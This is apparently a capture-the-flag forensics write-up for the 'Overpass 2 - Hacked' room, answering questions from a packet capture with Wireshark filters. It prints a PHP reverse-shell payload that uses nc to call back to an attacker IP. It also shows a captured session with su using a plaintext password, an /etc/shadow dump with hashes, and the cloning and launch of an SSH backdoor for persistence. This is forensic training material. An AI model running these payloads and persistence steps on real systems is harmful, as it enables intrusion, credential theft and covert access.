# Overpass 2 - Hacked

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

## Q1 What was the URL of the page they used to upload a reverse shell?

Since there should be a interaction string its worth checking TCP streams. 
```
tcp.stream eq 1
```
There is only 13 packets, the only POST packet present looks interesting with file upload.php.

To upload its a POST request to send something so I tried:
```
http.request.method=="POST" 
```
There is only one packet in info column shows POST /development/upload.php
Also listed under Hypertext>POST>Request URI: /development/upload.php

Answer Q1: /development/

## Q2 What payload did the attacker use to gain access?

From the same POST packet the easiest way to view it is via follow TCP or HTTP stream.
Answer Q2: 
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
or can be found in the hypertext section but its broken into a series of very short lines.

## What password did the attacker use to privesc?

From the payload we can see the connection back to c2 is via port 4242.

Search for port 4242 and follow the TCP or http traffic: 
```
tcp.port==4242
```

Only a few packets down it shows the password and username james:

Answer Q3: whenevernoteartinstant

Note the sudo -l in the follow list from this search shows the user james seems to have sudo access to (ALL : ALL) ALL, which is significant.

```
/bin/sh: 0: can't access tty; job control turned off
$ 
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@overpass-production:/var/www/html/development/uploads$ 
ls -lAh

ls -lAh
total 8.0K
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
www-data@overpass-production:/var/www/html/development/uploads$ 
cat .overpass

cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ 
su james

su james
Password: 
whenevernoteartinstant


james@overpass-production:/var/www/html/development/uploads$ 
cd ~

cd ~
james@overpass-production:~$ 
sudo -l]

sudo -l]
sudo: invalid option -- ']'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
james@overpass-production:~$ 
sudo -l

sudo -l
[sudo] password for james: 
whenevernoteartinstant


Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$ 
sudo cat /etc/shadow

sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
james@overpass-production:~$ 
git clone https://github.com/NinjaJc01/ssh-backdoor


<git clone https://github.com/NinjaJc01/ssh-backdoor
Cloning into 'ssh-backdoor'...
remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        
remote: Counting objects:  11% (2/18)        
remote: Counting objects:  16% (3/18)        
remote: Counting objects:  22% (4/18)        
remote: Counting objects:  27% (5/18)        
remote: Counting objects:  33% (6/18)        
remote: Counting objects:  38% (7/18)        
remote: Counting objects:  44% (8/18)        
remote: Counting objects:  50% (9/18)        
remote: Counting objects:  55% (10/18)        
remote: Counting objects:  61% (11/18)        
remote: Counting objects:  66% (12/18)        
remote: Counting objects:  72% (13/18)        
remote: Counting objects:  77% (14/18)        
remote: Counting objects:  83% (15/18)        
remote: Counting objects:  88% (16/18)        
remote: Counting objects:  94% (17/18)        
remote: Counting objects: 100% (18/18)        
remote: Counting objects: 100% (18/18), done.        
remote: Compressing objects:   6% (1/15)        
remote: Compressing objects:  13% (2/15)        
remote: Compressing objects:  20% (3/15)        
remote: Compressing objects:  26% (4/15)        
remote: Compressing objects:  33% (5/15)        
remote: Compressing objects:  40% (6/15)        
remote: Compressing objects:  46% (7/15)        
remote: Compressing objects:  53% (8/15)        
remote: Compressing objects:  60% (9/15)        
remote: Compressing objects:  66% (10/15)        
remote: Compressing objects:  73% (11/15)        
remote: Compressing objects:  80% (12/15)        
remote: Compressing objects:  86% (13/15)        
remote: Compressing objects:  93% (14/15)        
remote: Compressing objects: 100% (15/15)        
remote: Compressing objects: 100% (15/15), done.        
Unpacking objects:   5% (1/18)   
Unpacking objects:  11% (2/18)   
Unpacking objects:  16% (3/18)   
Unpacking objects:  22% (4/18)   
Unpacking objects:  27% (5/18)   
Unpacking objects:  33% (6/18)   
Unpacking objects:  38% (7/18)   
remote: Total 18 (delta 4), reused 7 (delta 1), pack-reused 0        
Unpacking objects:  44% (8/18)   
Unpacking objects:  50% (9/18)   
Unpacking objects:  55% (10/18)   
Unpacking objects:  61% (11/18)   
Unpacking objects:  66% (12/18)   
Unpacking objects:  72% (13/18)   
Unpacking objects:  77% (14/18)   
Unpacking objects:  83% (15/18)   
Unpacking objects:  88% (16/18)   
Unpacking objects:  94% (17/18)   
Unpacking objects: 100% (18/18)   
Unpacking objects: 100% (18/18), done.
james@overpass-production:~$ 
cd ssh-backdoor

cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ 
ssh-keygen

ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/james/.ssh/id_rsa): 
id_rsa

id_rsa
Enter passphrase (empty for no passphrase): 



Enter same passphrase again: 



Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ 
chmod +x backdoor

chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```

# Q3 How did the attacker establish persistence?

Answer Q3: https://github.com/NinjaJc01/ssh-backdoor

Clearly from the previous follow on port 4242 it shows a ssh backdoor downloaded from github and at the very end after an ssh key is generated stored in normal location for ssh keys. The backdoor is loacted in folder ssh-backdoor.


